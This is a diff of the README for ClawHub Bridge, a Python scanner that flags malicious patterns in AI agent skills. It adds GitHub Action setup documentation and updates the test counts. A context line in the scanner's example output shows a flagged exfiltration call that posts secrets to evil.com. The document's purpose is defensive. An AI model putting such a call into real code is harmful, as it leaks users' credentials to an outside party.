@@ -62,13 +62,72 @@ print(result.capabilities)   # Capability profile
                -> requests.post("https://evil.com/steal", data=secrets)
 ```
 
+## GitHub Action
+
+Scan skills automatically on every PR:
+
+```yaml
+# .github/workflows/skill-scan.yml
+name: Skill Security Scan
+on:
+  pull_request:
+    paths: ['skills/**', '*.md']
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - uses: claude-go/clawhub-bridge@main
+        with:
+          path: './skills'
+```
+
+### Inputs
+
+| Input | Default | Description |
+|-------|---------|-------------|
+| `path` | `.` | File or directory to scan |
+| `fail-on-review` | `false` | Fail on REVIEW verdict too |
+| `version` | `main` | clawhub-bridge git ref |
+
+### Outputs
+
+| Output | Description |
+|--------|-------------|
+| `verdict` | PASS, REVIEW, or FAIL |
+| `total-findings` | Number of findings |
+| `critical-count` | Number of CRITICAL findings |
+| `results-json` | Full results as JSON |
+
+### Advanced: Use outputs in subsequent steps
+
+```yaml
+- uses: claude-go/clawhub-bridge@main
+  id: scan
+  with:
+    path: './skills'
+
+- name: Comment on PR if issues found
+  if: steps.scan.outputs.verdict != 'PASS'
+  uses: actions/github-script@v7
+  with:
+    script: |
+      github.rest.issues.createComment({
+        issue_number: context.issue.number,
+        owner: context.repo.owner,
+        repo: context.repo.repo,
+        body: `## Security scan: ${{ steps.scan.outputs.verdict }}\n${{ steps.scan.outputs.total-findings }} findings (${{ steps.scan.outputs.critical-count }} critical)`
+      })
+```
+
 ## Why
 
 AI agents use skills (plugins, tools, MCP servers) written by anyone. Most agent frameworks trust skills blindly. ClawHub Bridge doesn't.
 
 It scans skill content for **57 malicious patterns** across **13 categories**, infers a **capability profile** (what the skill actually needs access to), and returns a clear verdict: PASS, REVIEW, or FAIL.
 
-Zero dependencies. Pure Python. 96 tests.
+Zero dependencies. Pure Python. 104 tests. GitHub Action included.
 
 ## Detection Categories
 
@@ -112,7 +171,7 @@ A skill that reads files and makes HTTP requests gets `filesystem: READ, network
 python -m pytest tests/ -v
 ```
 
-96 tests covering all 13 detection categories, the capability lattice, and the converter.
+104 tests covering all 13 detection categories, the capability lattice, CLI batch output, and the converter.
 
 ## Related
 
